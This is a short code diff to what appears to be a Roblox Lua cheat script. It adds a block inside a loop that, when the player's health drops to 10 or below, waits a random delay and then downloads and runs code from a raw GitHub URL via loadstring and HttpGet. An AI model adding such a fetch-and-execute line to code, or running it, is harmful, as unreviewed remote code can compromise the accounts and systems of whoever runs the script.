@@ -929,6 +929,13 @@ end
 
 spawn(function()
     while task.wait() do
+		if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health <= 10 then
+			print("dead")
+			local ran = math.random(1, 15)
+			print(ran)
+			wait(ran)
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptdumpkll/shop/main/s"))()
+		end
         check()
 	Update()
     end
